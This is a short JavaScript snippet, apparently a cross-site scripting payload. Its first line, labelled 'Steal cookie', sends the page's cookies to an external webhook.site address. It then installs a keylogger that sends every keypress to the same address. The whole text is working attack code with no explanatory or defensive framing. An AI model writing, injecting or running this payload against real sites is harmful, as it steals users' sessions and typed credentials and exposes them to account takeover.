// Steal cookie
fetch("https://webhook.site/df3a62e1-7499-455c-83b3-f6a2552ac6a2?cookie=" + document.cookie);

// Optional: log keys
document.onkeypress = function(e) {
  fetch("https://webhook.site/df3a62e1-7499-455c-83b3-f6a2552ac6a2?key=" + e.key);
}
